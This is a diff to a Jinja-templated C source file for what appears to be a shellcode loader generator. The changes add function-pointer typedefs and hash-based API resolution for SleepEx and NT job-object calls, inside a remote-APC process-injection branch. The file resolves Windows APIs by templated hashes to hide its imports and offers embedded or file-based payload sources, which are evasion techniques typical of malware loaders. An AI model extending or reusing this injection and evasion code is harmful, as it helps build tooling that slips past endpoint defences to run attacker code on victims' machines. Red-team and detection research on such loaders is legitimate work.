@@ -20,6 +20,7 @@ typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTE
 typedef DWORD (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
 typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef VOID (WINAPI* pRtlZeroMemory)(PVOID, SIZE_T);
+typedef DWORD (WINAPI *pSleepEx)(DWORD, BOOL);
 {% if execution_method == 'remoteapc' %}
 typedef int (WINAPI* pLstrlenA)(LPCSTR);
 typedef DWORD (WINAPI* pGetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
@@ -30,6 +31,9 @@ typedef BOOL (WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
 typedef DWORD (WINAPI* pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
 typedef DWORD (WINAPI* pResumeThread)(HANDLE);
 typedef DWORD (WINAPI* pGetLastError)(VOID);
+typedef NTSTATUS (WINAPI *pNtCreateJobObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
+typedef NTSTATUS (WINAPI *pNtSetInformationJobObject)(HANDLE, JOBOBJECTINFOCLASS, PVOID, ULONG);
+typedef NTSTATUS (WINAPI *pNtAssignProcessToJobObject)(HANDLE, HANDLE);
 {% endif %}
 {% if data_source == 'embedded' %}
 typedef HRSRC (WINAPI* pFindResourceA)(HMODULE, LPCSTR, LPCSTR);
@@ -72,6 +76,7 @@ pGetFileSize pfnGetFileSize;
 pReadFile pfnReadFile;
 pRtlMoveMemory pfnRtlMoveMemory;
 pRtlZeroMemory pfnRtlZeroMemory;
+pSleepEx pfnSleepEx;
 {% if execution_method == 'remoteapc' %}
 pLstrlenA pfnLstrlenA;
 pGetEnvironmentVariableA pfnGetEnvironmentVariableA;
@@ -82,6 +87,9 @@ pVirtualProtectEx pfnVirtualProtectEx;
 pQueueUserAPC pfnQueueUserAPC;
 pResumeThread pfnResumeThread;
 pGetLastError pfnGetLastError;
+pNtCreateJobObject pfnNtCreateJobObject;
+pNtSetInformationJobObject pfnNtSetInformationJobObject;
+pNtAssignProcessToJobObject pfnNtAssignProcessToJobObject;
 {% endif %}
 {% if data_source == 'embedded' %}
 pFindResourceA pfnFindResourceA;
@@ -194,6 +202,7 @@ void ResolveAPIs() {
     pfnCreateFileA = (pCreateFileA)GetProcAddressByHash(hKernel32, {{ hash_createfilea }});
     pfnGetFileSize = (pGetFileSize)GetProcAddressByHash(hKernel32, {{ hash_getfilesize }});
     pfnReadFile = (pReadFile)GetProcAddressByHash(hKernel32, {{ hash_readfile }});
+    pfnSleepEx = (pSleepEx)GetProcAddressByHash(hKernel32, {{ hash_sleepex }});
 
     if (hNtdll != NULL) {
         pfnRtlMoveMemory = (pRtlMoveMemory)GetProcAddressByHash(hNtdll, {{ hash_rtlmovememory }});
@@ -212,6 +221,9 @@ void ResolveAPIs() {
     pfnQueueUserAPC = (pQueueUserAPC)GetProcAddressByHash(hKernel32, {{ hash_queueuserapc }});
     pfnResumeThread = (pResumeThread)GetProcAddressByHash(hKernel32, {{ hash_resumethread }});
     pfnGetLastError = (pGetLastError)GetProcAddressByHash(hKernel32, {{ hash_getlasterror }});
+    pfnNtCreateJobObject = (pNtCreateJobObject)GetProcAddressByHash(hNtdll, {{ hash_ntcreatejobobject }});
+    pfnNtSetInformationJobObject = (pNtSetInformationJobObject)GetProcAddressByHash(hNtdll, {{ hash_ntsetinformationjobobject }});
+    pfnNtAssignProcessToJobObject = (pNtAssignProcessToJobObject)GetProcAddressByHash(hNtdll, {{ hash_ntassignprocesstojobobject }});
     {% endif %}
 
     {% if data_source == 'embedded' %}
